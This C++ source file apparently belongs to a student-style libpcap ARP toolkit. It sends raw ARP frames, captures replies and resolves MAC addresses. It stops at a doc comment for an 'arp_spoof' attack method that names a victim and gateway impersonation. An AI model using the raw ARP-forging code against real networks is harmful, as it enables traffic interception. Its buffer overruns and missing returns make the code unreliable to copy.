#include "agent.h"

Agent::Agent(){
    BZERO(mac, ETH_ALEN);
    BZERO(ip, 4);
}

Agent::Agent(std::string name): Agent(){
    if(name.length() > MAXNAME){
        std::cerr << "[X]Error: agent name too long" << std::endl;
        exit(-1);
    }
    this->name = name;
}

Agent::Agent(std::string name, std::string dev) : Agent(name){
    if(dev.length() > MAXDEV){
        std::cerr << "[X]Error: device name too long" << std::endl;
        exit(-1);
    }

    this->dev = dev;
    get_dev_info(dev, mac, ip);
    parse_mac(mac, &mac_str);
    inet_ntop(AF_INET, ip, const_cast<char*>(ip_str.c_str()), sizeof(ip_str));
}

Agent::Agent(const Agent &p){
    this->name = p.name;
    this->dev = p.dev;
    memcpy(this->mac, p.mac, ETH_ALEN+1);
    this->mac_str = p.mac_str;
    memcpy(this->ip, p.ip, 4+1);
    this->ip_str = p.ip_str;
}

void Agent::set_mac(pktbyte_n *_mac){
    memcpy(mac, _mac, ETH_ALEN);
    parse_mac(mac, &mac_str);
}

void Agent::set_mac_str(std::string mac_str){
    this->mac_str = mac_str;

    for(int i=0; i < ETH_ALEN; i++){
        this->mac[i] = static_cast<char>(strtol(mac_str.substr(i*3,2).c_str(), NULL, 16));
    }
}

void Agent::set_ip_str(std::string ip_str){
    if(ip_str.length() > MAXIPSTR){
        std::cerr << "[X]Error: Length of IP is too long" << std::endl;
        exit(-1);
    }

    this->ip_str = ip_str;
    inet_pton(AF_INET, ip_str.c_str(), ip);
}

void Agent::show_info(){
    std::cout << "Agent name: " << this->get_name() << std::endl;
    std::cout << "Agent MAC: " << this->get_mac_str() << std::endl;
    std::cout << "Agent IP: " << this->get_ip_str() << std::endl;
    std::cout << std::endl;
}

int Agent::send(Xpkt *pkt){
    std::string dev = this->get_dev();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    int res;

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    if(!pcap_inject(handle, pkt->get_pktbuf(), pkt->get_len())){
        pcap_perror(handle, "send: ");
        return -1;
    }

    pcap_close(handle);
    return 0;
}

int Agent::set_pcap_filter(pcap_t *handle, char *filter, bpf_u_int32 net){
    struct bpf_program fp;
    
    if(pcap_compile(handle, &fp, filter, 0, net) == -1) {
        fprintf(stderr, "[-] Can't parse filter \'%s\'\n==> %s\n", filter, pcap_geterr(handle));
        return -1;
    }

    if(pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "[-] Can't install filter \'%s\'\n==>%s\n", filter, pcap_geterr(handle));
        return -1;
    }
}

/* [TODO]
int Agent::dump(char *dev, Xpkt *pkt, bool (*callback)(pktbyte *pkt)){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        return -1;
    }

    while(true){
        struct pcap_pkthdr *header;

        pktbyte *pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        if(filter && filter(pkt)) 
            break;
    }

    return 0;
}
*/

/*  
    Name: snatch
    Namespace: Agent
    Type: Method
    Args: 
        Xpkt *xpkt: filtered packet
        bool (*filter)(pktbyte_n *pkt): filtering callback function 
    Description:
        Snatch the filtered packet
    Note:
        -   인자들을 수정하고, 함수의 일부를 수정해서 정해진 시간동안
            필터링된 패킷들을 벡터로 전부 반환하게 하면 전반듯인
            안정성이 개선될듯
*/
void Agent::snatch(std::vector<Xpkt> *caught, const char *pcap_filter, int cnt){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL) {
        std::cerr << "couldn't open device "<< dev << ":" << errbuf << std::endl;
        exit(-1);
    }

    if(pcap_filter == nullptr){
        std::cerr << "pcap filter is required" <<std::endl;
        exit(-1);
    }

    set_pcap_filter(handle, const_cast<char*>(pcap_filter), *(reinterpret_cast<bpf_u_int32*>(this->ip)));

    for(int i=0; i<100; i++){
        struct pcap_pkthdr *header;
        const pktbyte_n *packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if(caught->size() == cnt)
            break;

        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        caught->push_back(Xpkt(const_cast<pktbyte_n *>(packet), header->len));
    }

    pcap_close(handle);
}

/*  
    Name: arp_send_req
    Namespace: Agent
    Type: Method
    Args: 
        Agent *target: Target of ARP request
    Description:
        Broadcast normal ARP request
*/
void Agent::arp_send_req(Agent *target){
    std::string dev = this->get_dev();
    pktbyte_n *src_mac = this->get_mac();
    pktbyte_n *src_ip = this->get_ip();
    pktbyte_n *target_ip = target->get_ip();

    // Set destination mac of ethernet frame as broadcast(FF:FF:FF:FF:FF:FF)
    pktbyte_n eth_dst[ETH_ALEN];
    memset(eth_dst, 0xff, ETH_ALEN);        

    // Set target hardware address of ARP header as NULL
    pktbyte_n arp_tha[ETH_ALEN];
    BZERO(arp_tha, ETH_ALEN);

    Ether ethhdr = Ether(eth_dst, src_mac, ETH_P_ARP);
    Arp arp = Arp(ARPOP_REQUEST, src_mac, src_ip, arp_tha, target_ip);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(&pkt)){
        std::cerr << "[X]Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}


/*  
    Name: arp_send_raw
    Namespace: Agent
    Type: Method
    Args: 
        pktword_h op
        pktbyte_n *sha
        pktbyte_n *sip
        pktbyte_n *tha
        pktbyte_n *tip
    Description:
        Send ARP packet in fully low level.
*/
int Agent::arp_send_raw(
    pktword_h op, 
    pktbyte_n *sha, 
    pktbyte_n *sip, 
    pktbyte_n *tha, 
    pktbyte_n *tip
){
    Ether ethhdr = Ether(tha, sha, ETH_P_ARP);
    Arp arp = Arp(op, sha, sip, tha, tip);

    Xpkt pkt = ethhdr / arp;

    if(Agent::send(&pkt)){
        std::cerr << "[X]Error occured while sending packet" << std::endl;
        std::cerr << "[packet]" << std::endl;
        pkt.hexdump(ALL);
    }
}

/*
    Name: arp_get_target_mac
    Namespace: Agent
    Type: Method
    Args:
        Agent *target
    Description:
        Using ARP protocol, get MAC address of target IP address.
    Note:
        -   snatch된 패킷이 정확히 target에 관한 arp reply인지 확신할 수 없음
            snatch함수 자체에 타임아웃을 부여함고, 제한시간동안 캡쳐된 패킷들을 vector로 반환하고,
            반환된 arp vector에 대해 탐색하면서, 원하는 reply를 선별하도록 하면 보다 안정적으로 개선 가능할듯
        -   ARP request가 항상 성공하는 것이 아니므로 이에 관한 처리가 필요함
*/
int Agent::arp_get_target_mac(Agent *target){
    std::vector<Xpkt> caught;
    std::string target_dev = target->get_dev();
    std::string target_ip_str = target->get_ip_str();
    std::string target_mac_str;
    std::string pcap_filter = "arp";
    pcap_filter += " and src host " + target_ip_str;
    pcap_filter += " and (arp[6:2] = 2)";

    std::thread snatcher(&Agent::snatch, this, &caught, pcap_filter.c_str(), 1);

    usleep(300); // Wait little for snatcher to be ready

    std::cout << "[ARP / Get mac address]" << std::endl;
    std::cout << "Target IP: " << target_ip_str << std::endl;

    for(int i=0; i<3; i++)
        Agent::arp_send_req(target);
    snatcher.join();

    if(caught.size() == 0){
        std::cerr << "[!] " << target->get_name() << "(" <<target_ip_str << ") doesn't reply to our request" << std::endl;
        exit(-1);
    }

    Arp arp = Arp(caught[0]);
    target->set_mac(arp.get_sha());

    target_mac_str = target->get_mac_str();

    std::ios_base::fmtflags f( std::cout.flags() );

    std::cout << "Result: " << std::endl;
    std::cout.setf(std::ios_base::left);
    std::cout << std::setw(MAXIPSTR+3) << "IP" << std::setw(MAXMACSTR) << "MAC" << std::endl;
    std::cout << std::setw(MAXIPSTR+3) << target_ip_str << std::setw(MAXMACSTR) << target_mac_str << std::endl;
    std::cout << std::endl;

    std::cout.flags(f);

    return true;
}

/*
    Name: arp_spoof
    Namespace: Agent
    Type: Method
    Args:
        Agent *sender: Victim of attack
        Agent *target: Usually gateway of sender. Attacker would pretend to be it.
    Description:
        Do ARP spoof attack
    Note:
        Error handling
*/